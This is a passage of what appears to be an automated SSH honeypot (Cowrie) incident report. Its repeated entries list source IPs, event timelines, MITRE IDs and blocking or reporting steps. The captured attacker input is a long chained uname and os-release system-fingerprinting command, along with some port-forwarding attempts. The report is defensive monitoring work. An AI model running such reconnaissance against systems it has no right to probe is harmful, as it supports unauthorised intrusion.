| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:34:38` | `cowrie.session.connect` |
| `2026-07-26 05:34:38` | `cowrie.client.version` |
| `2026-07-26 05:34:38` | `cowrie.client.kex` |
| `2026-07-26 05:34:40` | `cowrie.login.success` |
| `2026-07-26 05:34:42` | `cowrie.session.params` |
| `2026-07-26 05:34:42` | `cowrie.command.input` |
| `2026-07-26 05:34:42` | `cowrie.command.input` |
| `2026-07-26 05:34:42` | `cowrie.command.input` |
| `2026-07-26 05:34:42` | `cowrie.command.input` |
| `2026-07-26 05:34:42` | `cowrie.command.input` |
| `2026-07-26 05:34:42` | `cowrie.command.success` |
| `2026-07-26 05:34:42` | `cowrie.command.input` |
| `2026-07-26 05:34:42` | `cowrie.command.input` |
| `2026-07-26 05:34:42` | `cowrie.command.input` |
| `2026-07-26 05:34:42` | `cowrie.command.input` |
| `2026-07-26 05:34:43` | `cowrie.log.closed` |
| `2026-07-26 05:34:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09ca5a86ce5d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:36 |
| **Last Seen** | 2026-07-26 05:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:36:21` | `cowrie.session.connect` |
| `2026-07-26 05:36:22` | `cowrie.client.version` |
| `2026-07-26 05:36:22` | `cowrie.client.kex` |
| `2026-07-26 05:36:23` | `cowrie.login.success` |
| `2026-07-26 05:36:25` | `cowrie.session.params` |
| `2026-07-26 05:36:25` | `cowrie.command.input` |
| `2026-07-26 05:36:25` | `cowrie.command.input` |
| `2026-07-26 05:36:25` | `cowrie.command.input` |
| `2026-07-26 05:36:25` | `cowrie.command.input` |
| `2026-07-26 05:36:25` | `cowrie.command.input` |
| `2026-07-26 05:36:25` | `cowrie.command.success` |
| `2026-07-26 05:36:25` | `cowrie.command.input` |
| `2026-07-26 05:36:25` | `cowrie.command.input` |
| `2026-07-26 05:36:25` | `cowrie.command.input` |
| `2026-07-26 05:36:25` | `cowrie.command.input` |
| `2026-07-26 05:36:25` | `cowrie.log.closed` |
| `2026-07-26 05:36:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-476291eff8af

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:38 |
| **Last Seen** | 2026-07-26 05:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:38:03` | `cowrie.session.connect` |
| `2026-07-26 05:38:04` | `cowrie.client.version` |
| `2026-07-26 05:38:04` | `cowrie.client.kex` |
| `2026-07-26 05:38:06` | `cowrie.login.success` |
| `2026-07-26 05:38:07` | `cowrie.session.params` |
| `2026-07-26 05:38:07` | `cowrie.command.input` |
| `2026-07-26 05:38:07` | `cowrie.command.input` |
| `2026-07-26 05:38:07` | `cowrie.command.input` |
| `2026-07-26 05:38:07` | `cowrie.command.input` |
| `2026-07-26 05:38:07` | `cowrie.command.input` |
| `2026-07-26 05:38:07` | `cowrie.command.success` |
| `2026-07-26 05:38:07` | `cowrie.command.input` |
| `2026-07-26 05:38:07` | `cowrie.command.input` |
| `2026-07-26 05:38:07` | `cowrie.command.input` |
| `2026-07-26 05:38:07` | `cowrie.command.input` |
| `2026-07-26 05:38:07` | `cowrie.log.closed` |
| `2026-07-26 05:38:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41d09d71b548

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:39 |
| **Last Seen** | 2026-07-26 05:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:39:46` | `cowrie.session.connect` |
| `2026-07-26 05:39:46` | `cowrie.client.version` |
| `2026-07-26 05:39:46` | `cowrie.client.kex` |
| `2026-07-26 05:39:48` | `cowrie.login.success` |
| `2026-07-26 05:39:50` | `cowrie.session.params` |
| `2026-07-26 05:39:50` | `cowrie.command.input` |
| `2026-07-26 05:39:50` | `cowrie.command.input` |
| `2026-07-26 05:39:50` | `cowrie.command.input` |
| `2026-07-26 05:39:50` | `cowrie.command.input` |
| `2026-07-26 05:39:50` | `cowrie.command.input` |
| `2026-07-26 05:39:50` | `cowrie.command.success` |
| `2026-07-26 05:39:50` | `cowrie.command.input` |
| `2026-07-26 05:39:50` | `cowrie.command.input` |
| `2026-07-26 05:39:50` | `cowrie.command.input` |
| `2026-07-26 05:39:50` | `cowrie.command.input` |
| `2026-07-26 05:39:50` | `cowrie.log.closed` |
| `2026-07-26 05:39:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1433ea43163d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:41 |
| **Last Seen** | 2026-07-26 05:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:41:29` | `cowrie.session.connect` |
| `2026-07-26 05:41:29` | `cowrie.client.version` |
| `2026-07-26 05:41:29` | `cowrie.client.kex` |
| `2026-07-26 05:41:31` | `cowrie.login.success` |
| `2026-07-26 05:41:32` | `cowrie.session.params` |
| `2026-07-26 05:41:32` | `cowrie.command.input` |
| `2026-07-26 05:41:32` | `cowrie.command.input` |
| `2026-07-26 05:41:32` | `cowrie.command.input` |
| `2026-07-26 05:41:32` | `cowrie.command.input` |
| `2026-07-26 05:41:32` | `cowrie.command.input` |
| `2026-07-26 05:41:32` | `cowrie.command.success` |
| `2026-07-26 05:41:32` | `cowrie.command.input` |
| `2026-07-26 05:41:32` | `cowrie.command.input` |
| `2026-07-26 05:41:32` | `cowrie.command.input` |
| `2026-07-26 05:41:32` | `cowrie.command.input` |
| `2026-07-26 05:41:33` | `cowrie.log.closed` |
| `2026-07-26 05:41:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b16dd122671a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:43 |
| **Last Seen** | 2026-07-26 05:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:43:10` | `cowrie.session.connect` |
| `2026-07-26 05:43:10` | `cowrie.client.version` |
| `2026-07-26 05:43:10` | `cowrie.client.kex` |
| `2026-07-26 05:43:12` | `cowrie.login.success` |
| `2026-07-26 05:43:14` | `cowrie.session.params` |
| `2026-07-26 05:43:14` | `cowrie.command.input` |
| `2026-07-26 05:43:14` | `cowrie.command.input` |
| `2026-07-26 05:43:14` | `cowrie.command.input` |
| `2026-07-26 05:43:14` | `cowrie.command.input` |
| `2026-07-26 05:43:14` | `cowrie.command.input` |
| `2026-07-26 05:43:14` | `cowrie.command.success` |
| `2026-07-26 05:43:14` | `cowrie.command.input` |
| `2026-07-26 05:43:14` | `cowrie.command.input` |
| `2026-07-26 05:43:14` | `cowrie.command.input` |
| `2026-07-26 05:43:14` | `cowrie.command.input` |
| `2026-07-26 05:43:14` | `cowrie.log.closed` |
| `2026-07-26 05:43:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-653ab65ee34d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:44 |
| **Last Seen** | 2026-07-26 05:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:44:52` | `cowrie.session.connect` |
| `2026-07-26 05:44:53` | `cowrie.client.version` |
| `2026-07-26 05:44:53` | `cowrie.client.kex` |
| `2026-07-26 05:44:54` | `cowrie.login.success` |
| `2026-07-26 05:44:56` | `cowrie.session.params` |
| `2026-07-26 05:44:56` | `cowrie.command.input` |
| `2026-07-26 05:44:56` | `cowrie.command.input` |
| `2026-07-26 05:44:56` | `cowrie.command.input` |
| `2026-07-26 05:44:56` | `cowrie.command.input` |
| `2026-07-26 05:44:56` | `cowrie.command.input` |
| `2026-07-26 05:44:56` | `cowrie.command.success` |
| `2026-07-26 05:44:56` | `cowrie.command.input` |
| `2026-07-26 05:44:56` | `cowrie.command.input` |
| `2026-07-26 05:44:56` | `cowrie.command.input` |
| `2026-07-26 05:44:56` | `cowrie.command.input` |
| `2026-07-26 05:44:56` | `cowrie.log.closed` |
| `2026-07-26 05:44:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea9a9666e465

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:46 |
| **Last Seen** | 2026-07-26 05:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:46:32` | `cowrie.session.connect` |
| `2026-07-26 05:46:33` | `cowrie.client.version` |
| `2026-07-26 05:46:33` | `cowrie.client.kex` |
| `2026-07-26 05:46:34` | `cowrie.login.success` |
| `2026-07-26 05:46:36` | `cowrie.session.params` |
| `2026-07-26 05:46:36` | `cowrie.command.input` |
| `2026-07-26 05:46:36` | `cowrie.command.input` |
| `2026-07-26 05:46:36` | `cowrie.command.input` |
| `2026-07-26 05:46:36` | `cowrie.command.input` |
| `2026-07-26 05:46:36` | `cowrie.command.input` |
| `2026-07-26 05:46:36` | `cowrie.command.success` |
| `2026-07-26 05:46:36` | `cowrie.command.input` |
| `2026-07-26 05:46:36` | `cowrie.command.input` |
| `2026-07-26 05:46:36` | `cowrie.command.input` |
| `2026-07-26 05:46:36` | `cowrie.command.input` |
| `2026-07-26 05:46:36` | `cowrie.log.closed` |
| `2026-07-26 05:46:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-baf286ad5b45

| Field | Detail |
|---|---|
| **Source IP** | `220.246.41[.]171` |
| **First Seen** | 2026-07-26 05:47 |
| **Last Seen** | 2026-07-26 05:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:47:17` | `cowrie.session.connect` |
| `2026-07-26 05:47:18` | `cowrie.client.version` |
| `2026-07-26 05:47:18` | `cowrie.client.kex` |
| `2026-07-26 05:47:20` | `cowrie.login.success` |
| `2026-07-26 05:47:21` | `cowrie.direct-tcpip.request` |
| `2026-07-26 05:47:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.41[.]171` to AbuseIPDB if not already reported
- [ ] Block `220.246.41[.]171` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00c918117317

| Field | Detail |
|---|---|
| **Source IP** | `180.76.52[.]146` |
| **First Seen** | 2026-07-26 05:47 |
| **Last Seen** | 2026-07-26 05:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:47:31` | `cowrie.session.connect` |
| `2026-07-26 05:47:32` | `cowrie.client.version` |
| `2026-07-26 05:47:32` | `cowrie.client.kex` |
| `2026-07-26 05:47:34` | `cowrie.login.success` |
| `2026-07-26 05:47:35` | `cowrie.direct-tcpip.request` |
| `2026-07-26 05:47:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.52[.]146` to AbuseIPDB if not already reported
- [ ] Block `180.76.52[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9763c71ed9b2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:48 |
| **Last Seen** | 2026-07-26 05:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:48:06` | `cowrie.session.connect` |
| `2026-07-26 05:48:06` | `cowrie.client.version` |
| `2026-07-26 05:48:06` | `cowrie.client.kex` |
| `2026-07-26 05:48:08` | `cowrie.login.success` |
| `2026-07-26 05:48:09` | `cowrie.session.params` |
| `2026-07-26 05:48:09` | `cowrie.command.input` |
| `2026-07-26 05:48:09` | `cowrie.command.input` |
| `2026-07-26 05:48:09` | `cowrie.command.input` |
| `2026-07-26 05:48:09` | `cowrie.command.input` |
| `2026-07-26 05:48:09` | `cowrie.command.input` |
| `2026-07-26 05:48:09` | `cowrie.command.success` |
| `2026-07-26 05:48:09` | `cowrie.command.input` |
| `2026-07-26 05:48:09` | `cowrie.command.input` |
| `2026-07-26 05:48:09` | `cowrie.command.input` |
| `2026-07-26 05:48:09` | `cowrie.command.input` |
| `2026-07-26 05:48:10` | `cowrie.log.closed` |
| `2026-07-26 05:48:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0793f92d6637

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:49 |
| **Last Seen** | 2026-07-26 05:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:49:39` | `cowrie.session.connect` |
| `2026-07-26 05:49:39` | `cowrie.client.version` |
| `2026-07-26 05:49:39` | `cowrie.client.kex` |
| `2026-07-26 05:49:41` | `cowrie.login.success` |
| `2026-07-26 05:49:42` | `cowrie.session.params` |
| `2026-07-26 05:49:42` | `cowrie.command.input` |
| `2026-07-26 05:49:42` | `cowrie.command.input` |
| `2026-07-26 05:49:42` | `cowrie.command.input` |
| `2026-07-26 05:49:42` | `cowrie.command.input` |
| `2026-07-26 05:49:42` | `cowrie.command.input` |
| `2026-07-26 05:49:42` | `cowrie.command.success` |
| `2026-07-26 05:49:42` | `cowrie.command.input` |
| `2026-07-26 05:49:42` | `cowrie.command.input` |
| `2026-07-26 05:49:42` | `cowrie.command.input` |
| `2026-07-26 05:49:42` | `cowrie.command.input` |
| `2026-07-26 05:49:42` | `cowrie.log.closed` |
| `2026-07-26 05:49:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-026cc3cd1729

| Field | Detail |
|---|---|
| **Source IP** | `154.221.24[.]172` |
| **First Seen** | 2026-07-26 05:50 |
| **Last Seen** | 2026-07-26 05:50 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:50:10` | `cowrie.session.connect` |
| `2026-07-26 05:50:11` | `cowrie.client.version` |
| `2026-07-26 05:50:12` | `cowrie.client.kex` |
| `2026-07-26 05:50:17` | `cowrie.login.success` |
| `2026-07-26 05:50:18` | `cowrie.session.params` |
| `2026-07-26 05:50:18` | `cowrie.command.input` |
| `2026-07-26 05:50:19` | `cowrie.log.closed` |
| `2026-07-26 05:50:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.24[.]172` to AbuseIPDB if not already reported
- [ ] Block `154.221.24[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f389ba3151b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:51 |
| **Last Seen** | 2026-07-26 05:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:51:17` | `cowrie.session.connect` |
| `2026-07-26 05:51:17` | `cowrie.client.version` |
| `2026-07-26 05:51:17` | `cowrie.client.kex` |
| `2026-07-26 05:51:19` | `cowrie.login.success` |
| `2026-07-26 05:51:20` | `cowrie.session.params` |
| `2026-07-26 05:51:20` | `cowrie.command.input` |
| `2026-07-26 05:51:20` | `cowrie.command.input` |
| `2026-07-26 05:51:20` | `cowrie.command.input` |
| `2026-07-26 05:51:20` | `cowrie.command.input` |
| `2026-07-26 05:51:20` | `cowrie.command.input` |
| `2026-07-26 05:51:20` | `cowrie.command.success` |
| `2026-07-26 05:51:20` | `cowrie.command.input` |
| `2026-07-26 05:51:20` | `cowrie.command.input` |
